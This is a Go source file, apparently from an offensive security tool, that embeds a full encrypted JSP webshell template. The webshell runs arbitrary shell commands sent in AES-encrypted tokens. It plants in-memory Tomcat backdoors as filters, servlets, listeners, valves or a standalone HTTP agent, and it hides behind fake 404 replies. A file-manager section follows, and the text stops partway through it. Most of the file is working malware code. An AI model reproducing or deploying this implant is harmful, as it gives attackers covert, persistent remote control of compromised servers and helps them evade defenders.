package scanner

// shellV2JSPTemplate is the encrypted JSP runtime. Besides ping/exec/delete/
// rotate it carries the memory-shell installer (filter/servlet/listener/valve/
// agent) so one deployed file can plant, probe and remove in-memory endpoints.
// The runtime only uses reflection + JSP implicit objects: it compiles under
// both javax (Tomcat 9) and jakarta (Tomcat 10) servlet APIs.
const shellV2JSPTemplate = `<%@ page import="java.io.*,java.util.*,java.util.concurrent.*,javax.crypto.*,javax.crypto.spec.*,java.nio.file.*,java.nio.file.attribute.*,java.security.*,java.util.zip.*,java.lang.reflect.*,java.net.*,com.sun.net.httpserver.*" %>
<%!
static final byte[] JW0 = Base64.getDecoder().decode("{{KEY}}");
static final String JWC = "{{CARRIER}}";
static final String JWF = ".{{BUILD}}.k";
static volatile byte[] JWKEY = JW0;
static byte[] jwkey() throws Exception { File f = new File(System.getProperty("java.io.tmpdir"), JWF); if (f.isFile() && f.length() > 0) { try { byte[] raw = Base64.getDecoder().decode(new String(Files.readAllBytes(f.toPath()), "UTF-8").trim()); if (raw.length == 32) { JWKEY = raw; } } catch (Exception e) { } } return JWKEY; }
static String jwb64e(byte[] b) { return Base64.getUrlEncoder().withoutPadding().encodeToString(b); }
static byte[] jwb64d(String s) { try { return Base64.getUrlDecoder().decode(s); } catch (Exception e) { return null; } }
static byte[] jwopen(byte[] k, String t) throws Exception { byte[] r = jwb64d(t); if (r == null || r.length < 37 || r[0] != 2) { return null; } long ts = 0; for (int i = 13; i < 21; i++) { ts = (ts << 8) | (r[i] & 0xff); } long now = System.currentTimeMillis() / 1000L; if (Math.abs(now - ts) > 300) { return null; } byte[] n = Arrays.copyOfRange(r, 1, 13); byte[] h = Arrays.copyOfRange(r, 0, 21); Cipher c = Cipher.getInstance("AES/GCM/NoPadding"); c.init(Cipher.DECRYPT_MODE, new SecretKeySpec(k, "AES"), new GCMParameterSpec(128, n)); c.updateAAD(h); try { return c.doFinal(Arrays.copyOfRange(r, 21, r.length)); } catch (Exception e) { return null; } }
static String jwseal(byte[] k, String p) throws Exception { byte[] n = new byte[12]; new SecureRandom().nextBytes(n); long ts = System.currentTimeMillis() / 1000L; byte[] h = new byte[21]; h[0] = 2; System.arraycopy(n, 0, h, 1, 12); for (int i = 0; i < 8; i++) { h[13 + i] = (byte)((ts >> (56 - i * 8)) & 0xff); } Cipher c = Cipher.getInstance("AES/GCM/NoPadding"); c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(k, "AES"), new GCMParameterSpec(128, n)); c.updateAAD(h); byte[] ct = c.doFinal(p.getBytes("UTF-8")); byte[] all = new byte[h.length + ct.length]; System.arraycopy(h, 0, all, 0, h.length); System.arraycopy(ct, 0, all, h.length, ct.length); return jwb64e(all); }
static byte[] jwarg(String p) { String[] a = p.split("\\|", 3); if (a.length < 2) { return null; } return jwb64d(a[1]); }
static String jwreply(byte[] out) throws Exception { String f = "0"; byte[] d = out; if (out.length >= 256) { ByteArrayOutputStream bo = new ByteArrayOutputStream(); GZIPOutputStream gz = new GZIPOutputStream(bo); gz.write(out); gz.close(); d = bo.toByteArray(); f = "1"; } byte[] pad = new byte[1 + (int)(Math.random() * 24)]; new SecureRandom().nextBytes(pad); return "OK|" + f + "|" + jwb64e(d) + "|" + jwb64e(pad); }
static boolean jwseen(String token) { long now = System.currentTimeMillis() / 1000L; for (Map.Entry<String, Long> e : JWS.entrySet()) { if (now - e.getValue() > 600) { JWS.remove(e.getKey(), e.getValue()); } } return JWS.putIfAbsent(token, now) != null; }
static final ConcurrentHashMap<String, Long> JWS = new ConcurrentHashMap<String, Long>();
static final Map<String, Object> JWREG = new ConcurrentHashMap<String, Object>();

static String jwmStr(Object o) { return o == null ? "" : String.valueOf(o); }
static String jwmClean(String s) { return s == null ? "" : s.replace('\n', ' ').replace('\r', ' '); }
static String jwmErr(String m) { return "MSERR\nmsg=" + jwmClean(m); }
static String jwmOk(String... kv) { StringBuilder sb = new StringBuilder("MSOK"); for (int i = 0; i + 1 < kv.length; i += 2) { sb.append('\n').append(kv[i]).append('=').append(jwmClean(kv[i + 1])); } return sb.toString(); }

static Object jwmField(Object o, String name) throws Exception {
  Class<?> c = o.getClass();
  while (c != null) {
    try { Field f = c.getDeclaredField(name); f.setAccessible(true); return f.get(o); }
    catch (NoSuchFieldException e) { c = c.getSuperclass(); }
  }
  throw new NoSuchFieldException(name);
}

static boolean jwmTypeOk(Class<?> p, Object a) {
  if (a == null) { return !p.isPrimitive(); }
  if (p.isPrimitive()) {
    if (p == boolean.class) { return a instanceof Boolean; }
    if (p == int.class) { return a instanceof Integer; }
    if (p == long.class) { return a instanceof Long; }
    if (p == byte.class) { return a instanceof Byte; }
    if (p == short.class) { return a instanceof Short; }
    if (p == char.class) { return a instanceof Character; }
    if (p == float.class) { return a instanceof Float; }
    if (p == double.class) { return a instanceof Double; }
    return false;
  }
  return p.isInstance(a);
}

static Method jwmMethod(Class<?> start, String name, Object[] args) {
  for (Class<?> c = start; c != null; c = c.getSuperclass()) {
    for (Method m : c.getDeclaredMethods()) {
      if (!m.getName().equals(name)) { continue; }
      Class<?>[] pts = m.getParameterTypes();
      if (pts.length != args.length) { continue; }
      boolean ok = true;
      for (int i = 0; i < pts.length; i++) { if (!jwmTypeOk(pts[i], args[i])) { ok = false; break; } }
      if (ok) { return m; }
    }
  }
  for (Method m : start.getMethods()) {
    if (!m.getName().equals(name)) { continue; }
    Class<?>[] pts = m.getParameterTypes();
    if (pts.length != args.length) { continue; }
    boolean ok = true;
    for (int i = 0; i < pts.length; i++) { if (!jwmTypeOk(pts[i], args[i])) { ok = false; break; } }
    if (ok) { return m; }
  }
  return null;
}

static Object jwmCall(Object target, String name, Object... args) throws Exception {
  if (target == null) { throw new IllegalArgumentException("目标为空: " + name); }
  Method m = jwmMethod(target.getClass(), name, args);
  if (m == null) { throw new NoSuchMethodException(target.getClass().getName() + "." + name); }
  m.setAccessible(true);
  try { return m.invoke(target, args); }
  catch (InvocationTargetException e) {
    Throwable t = e.getCause();
    if (t instanceof Exception) { throw (Exception) t; }
    if (t instanceof Error) { throw (Error) t; }
    throw new RuntimeException(t);
  }
}

static Class<?> jwmLoad(String... names) {
  ClassLoader[] cls = new ClassLoader[]{Thread.currentThread().getContextClassLoader(), ClassLoader.getSystemClassLoader()};
  for (String n : names) {
    for (ClassLoader cl : cls) {
      try { if (cl != null) { return Class.forName(n, false, cl); } } catch (Throwable e) { }
    }
    try { return Class.forName(n); } catch (Throwable e) { }
  }
  return null;
}

static Class<?> jwmServletClass(String simple) { return jwmLoad("jakarta.servlet." + simple, "javax.servlet." + simple); }

static Object jwmStd(Object ctx) throws Exception {
  Object a = ctx;
  try { Object inner = jwmField(a, "context"); if (inner != null) { a = inner; } } catch (Throwable e) { }
  try { Object inner = jwmField(a, "context"); if (inner != null) { a = inner; } } catch (Throwable e) { }
  return a;
}

static Object jwmProxy(Class<?> iface, InvocationHandler h) { return java.lang.reflect.Proxy.newProxyInstance(iface.getClassLoader(), new Class<?>[]{iface}, h); }

static Object jwmDefault(Class<?> t) {
  if (t == void.class) { return null; }
  if (!t.isPrimitive()) { return null; }
  if (t == boolean.class) { return Boolean.FALSE; }
  if (t == int.class) { return Integer.valueOf(0); }
  if (t == long.class) { return Long.valueOf(0L); }
  if (t == short.class) { return Short.valueOf((short)0); }
  if (t == byte.class) { return Byte.valueOf((byte)0); }
  if (t == char.class) { return Character.valueOf((char)0); }
  if (t == float.class) { return Float.valueOf(0f); }
  if (t == double.class) { return Double.valueOf(0d); }
  return null;
}

static String jwmPath(Object req) {
  try {
    String uri = jwmStr(jwmCall(req, "getRequestURI"));
    String cp = jwmStr(jwmCall(req, "getContextPath"));
    if (cp.length() > 0 && uri.startsWith(cp)) { uri = uri.substring(cp.length()); }
    int q = uri.indexOf('?');
    if (q >= 0) { uri = uri.substring(0, q); }
    return uri;
  } catch (Throwable e) { return ""; }
}

static boolean jwmMatch(Object req, String path) {
  String p = jwmPath(req);
  return p.equals(path) || p.startsWith(path + "/");
}

static void jwmWrite(Object resp, String body, int status) throws Exception {
  try { jwmCall(resp, "setStatus", Integer.valueOf(status)); } catch (Throwable e) { }
  try { jwmCall(resp, "setContentType", "text/html;charset=UTF-8"); } catch (Throwable e) { }
  Object w = jwmCall(resp, "getWriter");
  try { jwmCall(w, "print", body); jwmCall(w, "flush"); }
  catch (Throwable e) { jwmCall(w, "write", body); jwmCall(w, "flush"); }
}

static String jwmToken(Object req, String carrier) throws Exception {
  String tk = "";
  if (carrier.startsWith("X-")) { tk = jwmStr(jwmCall(req, "getHeader", carrier)); }
  else {
    tk = jwmStr(jwmCall(req, "getParameter", carrier));
    if (tk.length() == 0) { tk = jwmStr(jwmCall(req, "getHeader", carrier)); }
  }
  return tk;
}

static void jwmServe(Object ctx, Object req, Object resp, byte[] key, String carrier, String kind, String name, String path) throws Exception {
  String tk = jwmToken(req, carrier);
  if (tk.length() == 0) { jwmWrite(resp, "Not Found", 404); return; }
  byte[] pt = jwopen(key, tk);
  if (pt == null || jwseen(tk)) { jwmWrite(resp, "Not Found", 404); return; }
  String p = new String(pt, "UTF-8");
  String op = p.substring(0, 1);
  if ("P".equals(op)) { jwmWrite(resp, jwseal(key, jwreply(new byte[0])), 200); return; }
  if ("E".equals(op)) {
    byte[] cb = jwarg(p);
    if (cb == null) { jwmWrite(resp, "Not Found", 404); return; }
    String cmd = new String(cb, "UTF-8");
    String os = System.getProperty("os.name", "").toLowerCase();
    ProcessBuilder pb = os.contains("win") ? new ProcessBuilder("cmd.exe", "/c", cmd) : new ProcessBuilder("/bin/sh", "-c", cmd);
    pb.redirectErrorStream(true);
    Process pr = pb.start();
    ByteArrayOutputStream bo = new ByteArrayOutputStream();
    byte[] buf = new byte[8192];
    int n;
    while ((n = pr.getInputStream().read(buf)) > 0) { bo.write(buf, 0, n); }
    pr.waitFor();
    jwmWrite(resp, jwseal(key, jwreply(bo.toByteArray())), 200);
    return;
  }
  if ("I".equals(op)) {
    String info = "MSINFO\nkind=" + kind + "\nname=" + name + "\njava=" + System.getProperty("java.version", "") + "\nos=" + System.getProperty("os.name", "");
    jwmWrite(resp, jwseal(key, jwreply(info.getBytes("UTF-8"))), 200);
    return;
  }
  if ("D".equals(op)) {
    boolean ok = jwmRemove(ctx, kind, name, path);
    jwmWrite(resp, jwseal(key, jwreply((ok ? "__JWMS_DEL_OK__" : "__JWMS_DEL_FAIL__").getBytes("UTF-8"))), 200);
    return;
  }
  jwmWrite(resp, "Not Found", 404);
}

static boolean jwmOurs(Object o, String name) {
  if (o == null) { return false; }
  try {
    if (java.lang.reflect.Proxy.isProxyClass(o.getClass())) {
      InvocationHandler h = java.lang.reflect.Proxy.getInvocationHandler(o);
      try { return name.equals(jwmStr(jwmField(h, "name"))); } catch (Throwable e) { return false; }
    }
  } catch (Throwable e) { }
  return false;
}

static boolean jwmStopAgent(String name) {
  Object o = JWREG.remove(name);
  if (o instanceof HttpServer) { ((HttpServer)o).stop(0); return true; }
  return false;
}

static boolean jwmRemove(Object ctx, String kind, String name, String path) {
  try {
    if ("agent".equals(kind)) { return jwmStopAgent(name); }
    Object std = jwmStd(ctx);
    if ("filter".equals(kind)) {
      Object[] maps = (Object[]) jwmCall(std, "findFilterMaps");
      if (maps != null) {
        for (Object fm : maps) {
          if (name.equals(jwmStr(jwmCall(fm, "getFilterName")))) { jwmCall(std, "removeFilterMap", fm); }
        }
      }
      Object def = jwmCall(std, "findFilterDef", name);
      if (def != null) { jwmCall(std, "removeFilterDef", def); }
      try {
        Map cfg = (Map) jwmField(std, "filterConfigs");
        Object c = cfg.remove(name);
        if (c != null) { try { jwmCall(c, "release"); } catch (Throwable e) { } }
      } catch (Throwable e) { }
      return true;
    }
    if ("servlet".equals(kind)) {
      String[] pats = (String[]) jwmCall(std, "findServletMappings");
      if (pats != null) {
        for (String pat : pats) {
          String n = jwmStr(jwmCall(std, "findServletMapping", pat));
          if (name.equals(n)) { jwmCall(std, "removeServletMapping", pat); }
        }
      }
      Object child = jwmCall(std, "findChild", name);
      if (child != null) { jwmCall(std, "removeChild", child); }
      return true;
    }
    if ("listener".equals(kind)) {
      Object[] evs = (Object[]) jwmCall(std, "getApplicationEventListeners");
      if (evs != null) {
        List<Object> keep = new ArrayList<Object>();
        for (Object o : evs) { if (!jwmOurs(o, name)) { keep.add(o); } }
        jwmCall(std, "setApplicationEventListeners", (Object) keep.toArray(new Object[keep.size()]));
      }
      Object[] lcs = (Object[]) jwmCall(std, "getApplicationLifecycleListeners");
      if (lcs != null) {
        List<Object> lk = new ArrayList<Object>();
        for (Object o : lcs) { if (!jwmOurs(o, name)) { lk.add(o); } }
        jwmCall(std, "setApplicationLifecycleListeners", (Object) lk.toArray(new Object[lk.size()]));
      }
      final Object sink = jwmCall(std, "findChild", "sink_" + name);
      if (sink != null) {
        final Object ctx2 = std;
        new Thread(new Runnable() {
          public void run() {
            try { Thread.sleep(800); } catch (Throwable e) { }
            try { jwmCall(ctx2, "removeChild", sink); } catch (Throwable e) { }
          }
        }).start();
      }
      return true;
    }
    if ("valve".equals(kind)) {
      Object pipeline = jwmCall(std, "getPipeline");
      Object[] vs = (Object[]) jwmCall(pipeline, "getValves");
      boolean found = false;
      if (vs != null) {
        for (Object v : vs) { if (jwmOurs(v, name)) { jwmCall(pipeline, "removeValve", v); found = true; } }
      }
      return found;
    }
  } catch (Throwable e) { return false; }
  return false;
}

static Map<String, String> jwmFields(String s) {
  Map<String, String> m = new HashMap<String, String>();
  if (s == null) { return m; }
  for (String kv : s.split("&")) {
    int i = kv.indexOf('=');
    if (i > 0) { m.put(kv.substring(0, i), kv.substring(i + 1)); }
  }
  return m;
}

static String jwmsProbe(Object ctx) {
  String api = "none";
  if (jwmLoad("jakarta.servlet.ServletContext") != null) { api = "jakarta"; }
  else if (jwmLoad("javax.servlet.ServletContext") != null) { api = "javax"; }
  String container = "unknown";
  try {
    Class<?> sc = jwmLoad("org.apache.catalina.core.StandardContext");
    if (sc != null && sc.isInstance(jwmStd(ctx))) { container = "tomcat"; }
  } catch (Throwable e) { }
  StringBuilder types = new StringBuilder("agent");
  if ("tomcat".equals(container)) { types.append(",filter,servlet,listener,valve"); }
  return jwmOk("java", System.getProperty("java.version", ""), "os", System.getProperty("os.name", ""),
      "servlet_api", api, "container", container, "types", types.toString());
}

static String jwmsInstall(Object ctx, Map<String, String> f) {
  String kind = jwmStr(f.get("type")).toLowerCase();
  String name = jwmStr(f.get("name"));
  String path = jwmStr(f.get("path"));
  String carrier = jwmStr(f.get("carrier"));
  try {
    byte[] key = jwb64d(jwmStr(f.get("key")));
    if (key == null || key.length != 32) { return jwmErr("密钥无效"); }
    if (name.length() == 0 || path.length() == 0 || carrier.length() == 0) { return jwmErr("参数缺失"); }
    if (!path.startsWith("/")) { return jwmErr("路径必须以 / 开头"); }
    jwmRemove(ctx, kind, name, path);
    if ("agent".equals(kind)) {
      int port = 0;
      try { port = Integer.parseInt(jwmStr(f.get("port"))); } catch (Throwable e) { }
      if (port < 0 || port > 65535) { return jwmErr("端口无效"); }
      final HttpServer srv = HttpServer.create(new InetSocketAddress(port), 0);
      srv.createContext(path, new JWA(key, carrier, name, path));
      srv.setExecutor(Executors.newCachedThreadPool(new ThreadFactory() {
        public Thread newThread(Runnable r) { Thread t = new Thread(r, "jw-agent"); t.setDaemon(true); return t; }
      }));
      srv.start();
      JWREG.put(name, srv);
      return jwmOk("type", kind, "name", name, "path", path, "port", String.valueOf(srv.getAddress().getPort()));
    }
    Object std = jwmStd(ctx);
    ClassLoader ccl = std.getClass().getClassLoader();
    if ("filter".equals(kind)) {
      Class<?> fi = jwmServletClass("Filter");
      if (fi == null) { return jwmErr("Servlet API 不可用"); }
      JWM h = new JWM(kind, name, path, carrier, key, ctx);
      Object proxy = jwmProxy(fi, h);
      h.self = proxy;
      Class<?> fdCls = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef", true, ccl);
      Object def = fdCls.newInstance();
      jwmCall(def, "setFilterName", name);
      jwmCall(def, "setFilter", proxy);
      jwmCall(std, "addFilterDef", def);
      Class<?> fmCls = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap", true, ccl);
      Object fm = fmCls.newInstance();
      jwmCall(fm, "setFilterName", name);
      jwmCall(fm, "addURLPattern", path);
      jwmCall(std, "addFilterMap", fm);
      Object cfg = null;
      Class<?> afcCls = Class.forName("org.apache.catalina.core.ApplicationFilterConfig", true, ccl);
      for (Constructor<?> ctor : afcCls.getDeclaredConstructors()) {
        Class<?>[] pts = ctor.getParameterTypes();
        if (pts.length == 2 && pts[0].isInstance(std) && pts[1].isInstance(def)) {
          ctor.setAccessible(true);
          cfg = ctor.newInstance(std, def);
          break;
        }
      }
      if (cfg == null) { return jwmErr("无法初始化 FilterConfig"); }
      Map cfgMap = (Map) jwmField(std, "filterConfigs");
      cfgMap.put(name, cfg);
      JWREG.put(name, proxy);
      return jwmOk("type", kind, "name", name, "path", path);
    }
    if ("servlet".equals(kind)) {
      Class<?> si = jwmServletClass("Servlet");
      if (si == null) { return jwmErr("Servlet API 不可用"); }
      JWM h = new JWM(kind, name, path, carrier, key, ctx);
      Object proxy = jwmProxy(si, h);
      h.self = proxy;
      Object wrapper = jwmCall(std, "createWrapper");
      jwmCall(wrapper, "setName", name);
      jwmCall(wrapper, "setServlet", proxy);
      try { jwmCall(wrapper, "setLoadOnStartup", Integer.valueOf(1)); } catch (Throwable e) { }
      jwmCall(std, "addChild", wrapper);
      jwmCall(std, "addServletMappingDecoded", path, name, Boolean.FALSE);
      JWREG.put(name, proxy);
      return jwmOk("type", kind, "name", name, "path", path);
    }
    if ("listener".equals(kind)) {
      Class<?> li = jwmServletClass("ServletRequestListener");
      if (li == null) { return jwmErr("Servlet API 不可用"); }
      if (jwmLoad("org.apache.catalina.connector.ResponseFacade") == null) { return jwmErr("Listener 型需要 Tomcat 响应通道"); }
      JWM h = new JWM(kind, name, path, carrier, key, ctx);
      h.sink = jwmSink(std, name);
      Object proxy = jwmProxy(li, h);
      h.self = proxy;
      jwmCall(std, "addApplicationEventListener", proxy);
      JWREG.put(name, proxy);
      return jwmOk("type", kind, "name", name, "path", path);
    }
    if ("valve".equals(kind)) {
      Class<?> vi = jwmLoad("org.apache.catalina.Valve");
      if (vi == null) { return jwmErr("Valve 型需要 Tomcat"); }
      Object pipeline = jwmCall(std, "getPipeline");
      JWM h = new JWM(kind, name, path, carrier, key, ctx);
      h.pipeline = pipeline;
      Object proxy = jwmProxy(vi, h);
      h.self = proxy;
      jwmCall(pipeline, "addValve", proxy);
      JWREG.put(name, proxy);
      return jwmOk("type", kind, "name", name, "path", path);
    }
    return jwmErr("不支持的内存马类型: " + kind);
  } catch (Throwable e) {
    return jwmErr(e.getClass().getSimpleName() + ": " + e.getMessage());
  }
}

static String jwmsRemoveOp(Object ctx, Map<String, String> f) {
  String kind = jwmStr(f.get("type")).toLowerCase();
  String name = jwmStr(f.get("name"));
  String path = jwmStr(f.get("path"));
  if (name.length() == 0) { return jwmErr("参数缺失"); }
  boolean ok = jwmRemove(ctx, kind, name, path);
  if (ok) { return jwmOk("type", kind, "name", name, "removed", "1"); }
  return jwmErr("移除失败");
}

static Object jwmListenerRequest(Object reqFacade) {
  try { return jwmField(reqFacade, "request"); } catch (Throwable e) { return reqFacade; }
}

static Object jwmListenerResponse(Object creq) {
  try {
    Object cresp = jwmCall(creq, "getResponse");
    try { return jwmCall(cresp, "getResponse"); } catch (Throwable e) { return cresp; }
  } catch (Throwable e) { return null; }
}

static Object jwmSink(Object std, String name) throws Exception {
  Class<?> si = jwmServletClass("Servlet");
  if (si == null) { throw new IllegalStateException("Servlet API 不可用"); }
  String sinkName = "sink_" + name;
  Object old = jwmCall(std, "findChild", sinkName);
  if (old != null) { jwmCall(std, "removeChild", old); }
  JWM h = new JWM("sink", sinkName, "", "", new byte[32], null);
  Object proxy = jwmProxy(si, h);
  Object w = jwmCall(std, "createWrapper");
  jwmCall(w, "setName", sinkName);
  jwmCall(w, "setServlet", proxy);
  jwmCall(std, "addChild", w);
  return w;
}

public static class JWM implements InvocationHandler {
  final String kind;
  final String name;
  final String path;
  final String carrier;
  final byte[] key;
  final Object ctx;
  volatile Object self;
  volatile Object pipeline;
  volatile Object cfg;
  volatile Object next;
  volatile Object sink;
  JWM(String kind, String name, String path, String carrier, byte[] key, Object ctx) {
    this.kind = kind; this.name = name; this.path = path; this.carrier = carrier; this.key = key; this.ctx = ctx;
  }
  public Object invoke(Object proxy, Method m, Object[] args) throws Throwable {
    String mn = m.getName();
    try {
      if ("equals".equals(mn) && args != null && args.length == 1) { return Boolean.valueOf(proxy == args[0]); }
      if ("hashCode".equals(mn) && (args == null || args.length == 0)) { return Integer.valueOf(System.identityHashCode(proxy)); }
      if ("toString".equals(mn) && (args == null || args.length == 0)) { return "jw:" + name; }
      if ("sink".equals(kind)) {
        if ("service".equals(mn) || "init".equals(mn) || "destroy".equals(mn)) { return null; }
        if ("getServletConfig".equals(mn)) { return null; }
        if ("getServletInfo".equals(mn)) { return "Jingwei"; }
      } else if ("filter".equals(kind)) {
        if ("doFilter".equals(mn)) {
          Object req = args[0], resp = args[1], chain = args[2];
          if (jwmMatch(req, path)) { jwmServe(ctx, req, resp, key, carrier, kind, name, path); return null; }
          return jwmCall(chain, "doFilter", req, resp);
        }
        if ("init".equals(mn) || "destroy".equals(mn)) { return null; }
      } else if ("servlet".equals(kind)) {
        if ("service".equals(mn)) {
          Object req = args[0], resp = args[1];
          if (jwmMatch(req, path)) { jwmServe(ctx, req, resp, key, carrier, kind, name, path); }
          else { jwmWrite(resp, "Not Found", 404); }
          return null;
        }
        if ("init".equals(mn)) { if (args != null && args.length > 0) { cfg = args[0]; } return null; }
        if ("destroy".equals(mn)) { return null; }
        if ("getServletConfig".equals(mn)) { return cfg; }
        if ("getServletInfo".equals(mn)) { return "Jingwei"; }
      } else if ("listener".equals(kind)) {
        if ("requestInitialized".equals(mn)) {
          Object ev = args[0];
          Object req = jwmCall(ev, "getServletRequest");
          Object creq = jwmListenerRequest(req);
          Object resp = jwmListenerResponse(creq);
          if (resp != null && jwmMatch(req, path)) {
            try {
              Object md = jwmCall(creq, "getMappingData");
              if (sink != null && md != null) {
                Field wf = md.getClass().getField("wrapper");
                wf.setAccessible(true);
                wf.set(md, sink);
              }
            } catch (Throwable e) { }
            jwmServe(ctx, req, resp, key, carrier, kind, name, path);
          }
          return null;
        }
        if ("requestDestroyed".equals(mn) || "sessionCreated".equals(mn) || "sessionDestroyed".equals(mn)
            || "contextInitialized".equals(mn) || "contextDestroyed".equals(mn)) { return null; }
      } else if ("valve".equals(kind)) {
        if ("invoke".equals(mn)) {
          Object req = args[0], resp = args[1];
          if (jwmMatch(req, path)) { jwmServe(ctx, req, resp, key, carrier, kind, name, path); return null; }
          Object nxt = next;
          if (nxt != null) { return jwmCall(nxt, "invoke", req, resp); }
          return null;
        }
        if ("getNext".equals(mn)) { return next; }
        if ("setNext".equals(mn)) { next = args[0]; return null; }
        if ("getInfo".equals(mn)) { return "jw:" + name; }
        if ("isAsyncSupported".equals(mn)) { return Boolean.FALSE; }
        if ("backgroundProcess".equals(mn)) { return null; }
      }
    } catch (Throwable e) {
      try { if (args != null && args.length >= 2) { jwmWrite(args[1], "Not Found", 404); } } catch (Throwable e2) { }
      return jwmDefault(m.getReturnType());
    }
    return jwmDefault(m.getReturnType());
  }
}

public static class JWA implements HttpHandler {
  final byte[] key;
  final String carrier;
  final String name;
  final String path;
  JWA(byte[] key, String carrier, String name, String path) { this.key = key; this.carrier = carrier; this.name = name; this.path = path; }
  public void handle(HttpExchange ex) throws IOException {
    try {
      String tk = "";
      if (carrier.startsWith("X-")) {
        List<String> vs = ex.getRequestHeaders().get(carrier);
        if (vs != null && !vs.isEmpty()) { tk = vs.get(0); }
      } else {
        tk = jwmParam(ex.getRequestURI().getRawQuery(), carrier);
        if (tk.length() == 0) { tk = jwmParam(jwmRead(ex.getRequestBody()), carrier); }
      }
      if (tk.length() == 0) { jwmAgentReply(ex, 404, "Not Found"); return; }
      byte[] pt = jwopen(key, tk);
      if (pt == null || jwseen(tk)) { jwmAgentReply(ex, 404, "Not Found"); return; }
      String p = new String(pt, "UTF-8");
      String op = p.substring(0, 1);
      if ("P".equals(op)) { jwmAgentReply(ex, 200, jwseal(key, jwreply(new byte[0]))); return; }
      if ("E".equals(op)) {
        byte[] cb = jwarg(p);
        if (cb == null) { jwmAgentReply(ex, 404, "Not Found"); return; }
        String cmd = new String(cb, "UTF-8");
        String os = System.getProperty("os.name", "").toLowerCase();
        ProcessBuilder pb = os.contains("win") ? new ProcessBuilder("cmd.exe", "/c", cmd) : new ProcessBuilder("/bin/sh", "-c", cmd);
        pb.redirectErrorStream(true);
        Process pr = pb.start();
        ByteArrayOutputStream bo = new ByteArrayOutputStream();
        byte[] buf = new byte[8192];
        int n;
        while ((n = pr.getInputStream().read(buf)) > 0) { bo.write(buf, 0, n); }
        pr.waitFor();
        jwmAgentReply(ex, 200, jwseal(key, jwreply(bo.toByteArray())));
        return;
      }
      if ("D".equals(op)) {
        Object o = JWREG.remove(name);
        jwmAgentReply(ex, 200, jwseal(key, jwreply("__JWMS_DEL_OK__".getBytes("UTF-8"))));
        if (o instanceof HttpServer) {
          final HttpServer srv = (HttpServer) o;
          new Thread(new Runnable() { public void run() { try { Thread.sleep(400); } catch (Throwable e) { } srv.stop(0); } }).start();
        }
        return;
      }
      if ("I".equals(op)) {
        String info = "MSINFO\nkind=agent\nname=" + name + "\njava=" + System.getProperty("java.version", "");
        jwmAgentReply(ex, 200, jwseal(key, jwreply(info.getBytes("UTF-8"))));
        return;
      }
      jwmAgentReply(ex, 404, "Not Found");
    } catch (Throwable e) {
      try { jwmAgentReply(ex, 404, "Not Found"); } catch (Throwable e2) { }
    } finally {
      try { ex.close(); } catch (Throwable e) { }
    }
  }
}

static String jwmParam(String s, String name) {
  if (s == null) { return ""; }
  for (String kv : s.split("&")) {
    int i = kv.indexOf('=');
    if (i > 0 && name.equals(kv.substring(0, i))) { return kv.substring(i + 1); }
  }
  return "";
}

static String jwmRead(InputStream in) {
  try {
    ByteArrayOutputStream bo = new ByteArrayOutputStream();
    byte[] buf = new byte[4096];
    int n;
    int total = 0;
    while ((n = in.read(buf)) > 0) { total += n; if (total > 1 << 20) { break; } bo.write(buf, 0, n); }
    return new String(bo.toByteArray(), "UTF-8");
  } catch (Throwable e) { return ""; }
}

static void jwmAgentReply(HttpExchange ex, int code, String body) throws IOException {
  byte[] b = body.getBytes("UTF-8");
  ex.getResponseHeaders().set("Content-Type", "text/html;charset=UTF-8");
  ex.sendResponseHeaders(code, b.length);
  OutputStream os = ex.getResponseBody();
  os.write(b);
  os.close();
}

static String jwfB64(String s) { try { return jwb64e(s.getBytes("UTF-8")); } catch (Exception e) { return ""; } }
static String jwfErr(String m) { return "ERR\n" + jwfB64(m == null ? "error" : m); }
static String jwfOk(String m) { return "OK\n" + jwfB64(m == null ? "" : m); }
static String jwfArg(String[] a, int i) { if (a.length <= i) { return ""; } byte[] b = jwb64d(a[i]); if (b == null) { return ""; } try { return new String(b, "UTF-8"); } catch (Exception e) { return ""; } }
static long jwfNum(String[] a, int i) { if (a.length <= i) { return 0; } try { return Long.parseLong(a[i].trim()); } catch (Exception e) { return 0; } }
static File jwfFile(String p) throws Exception { if (p == null || p.length() == 0) { p = System.getProperty("user.dir", "."); } return new File(p).getCanonicalFile(); }
static boolean jwfProtected(File f, String selfPath) {
  try {
    String c = f.getCanonicalPath();
    if (selfPath != null && selfPath.length() > 0 && c.equals(new File(selfPath).getCanonicalPath())) { return true; }
    return c.equals(new File(System.getProperty("java.io.tmpdir"), JWF).getCanonicalPath());
  } catch (Exception e) { return false; }
}
static boolean jwfRoot(File f) { return f.getParentFile() == null; }
static String jwfMode(File f) {
  try {
    Set<PosixFilePermission> ps = Files.getPosixFilePermissions(f.toPath(), LinkOption.NOFOLLOW_LINKS);
    int m = 0;
    if (ps.contains(PosixFilePermission.OWNER_READ)) { m |= 0400; }
    if (ps.contains(PosixFilePermission.OWNER_WRITE)) { m |= 0200; }
    if (ps.contains(PosixFilePermission.OWNER_EXECUTE)) { m |= 0100; }
    if (ps.contains(PosixFilePermission.GROUP_READ)) { m |= 0040; }
    if (ps.contains(PosixFilePermission.GROUP_WRITE)) { m |= 0020; }
    if (ps.contains(PosixFilePermission.GROUP_EXECUTE)) { m |= 0010; }
    if (ps.contains(PosixFilePermission.OTHERS_READ)) { m |= 0004; }
    if (ps.contains(PosixFilePermission.OTHERS_WRITE)) { m |= 0002; }
    if (ps.contains(PosixFilePermission.OTHERS_EXECUTE)) { m |= 0001; }
    return String.format("%04o", Integer.valueOf(m));
  } catch (Throwable e) { return "-"; }
}
static int jwfCmp(File a, File b) {
  boolean da = a.isDirectory(), db = b.isDirectory();
  if (da != db) { return da ? -1 : 1; }
  return a.getName().compareToIgnoreCase(b.getName());
}
static String jwfList(String p, String selfPath) {
  try {
    File dir = jwfFile(p);
    if (!dir.isDirectory()) { return jwfErr("not a directory"); }
    File[] kids = dir.listFiles();
    if (kids == null) { return jwfErr("permission denied"); }
    List<File> items = new ArrayList<File>(Arrays.asList(kids));
    Collections.sort(items, new Comparator<File>() { public int compare(File a, File b) { return jwfCmp(a, b); } });
    boolean trunc = items.size() > 3000;
    int n = trunc ? 3000 : items.size();
    StringBuilder sb = new StringBuilder("LIST");
    sb.append('\n').append(jwfB64(dir.getPath()));
    File parent = dir.getParentFile();
    sb.append('\n').append(jwfB64((parent == null ? dir : parent).getPath()));
    sb.append('\n').append(n).append('\n').append(trunc ? 1 : 0);
    for (int i = 0; i < n; i++) {
      File f = items.get(i);
